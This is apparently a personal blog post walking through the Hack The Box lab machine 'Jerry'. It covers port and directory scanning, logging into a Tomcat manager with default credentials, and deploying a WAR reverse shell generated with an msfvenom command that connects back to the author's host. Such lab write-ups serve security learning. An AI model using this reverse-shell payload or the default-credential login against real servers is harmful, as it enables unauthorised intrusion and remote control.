---
title: "[HTB] Jerry"
author: "Wook Lee"
date: "2024-08-07"
tags: ["Hack The Box"]
---

<div style="text-align: center"><img src="./200.gif"></div>

I was able to solve this box today on my own without relying on a walkthrough, following yesterday's success with the box named **_Blue_**. I feel like the hard work that I have put in over the past couple of months is finally paying off. I am so happy :)

---

#### nmap scan

![alt text](image.png#center)

<br>

![alt text](image-2.png#center)

<br>

#### directory busting with gobuster

`gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
![alt text](image-5.png#center)

<br>

***http://10.10.10.95:8080/docs***
![alt text](image-3.png#center)

<br>

***http://10.10.10.95:8080/example***
![alt text](image-4.png#center)

<br>

***http://10.10.10.95:8080/manager***
![alt text](image-6.png#center)

<br>

After few tries of default credentials, it automatically redirected me to **_manager/html_** page and the second line listed the username **_tomcat_** and the password **_s3cret_** so I tried the credentials, though I was skeptical.
![alt text](image-7.png#center)
![alt text](image-8.png#center)

<br>

Contrary to my doubts, the username and password I tried hit the mark and directed me to **_Tomcat Web Application Manager_**.
![alt text](image-9.png#center)

<br>

After scrolling down a bit, I found a section (**_WAR file to deploy_**.) where I could upload a file. As soon as I saw this functionality, I thought of a solution where I could generate a payload, run it on the server, and finally pop the reverse shell to gain access.
![alt text](image-10.png#center)

<br>

#### Generating payload

Since we need to upload a **.war** reverse shell, I refered to the **_Reverse Shell Cheatsheet_** from the famous **_PayloadsAllTheThings_** github.

![alt text](image-11.png#center)

The full command to generate the shell looks like this:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f war > reverse.war
strings reverse.war`

<br>

Uploaded the generated payload.
![alt text](image-12.png#center)

<br>

After uploading the payload and clicking the **Deploy** button, a new path named **_reverse_** appeared under the Applications section for the payload I created.
![alt text](image-13.png#center)

<br>

Before navigating to the new path to run the payload, I needed to set up a listener to listen for the port. Then, I successfully gained the shell.
![alt text](image-15.png#center)

<br>

After spending some time exploring the directories, I finally found the **_flags_** directory, in which included a text file called **_2 for the price of 1.txt_** and it contained both the user flag and the root flag.
![alt text](image-16.png#center)

<br>

![alt text](image-17.png#center)
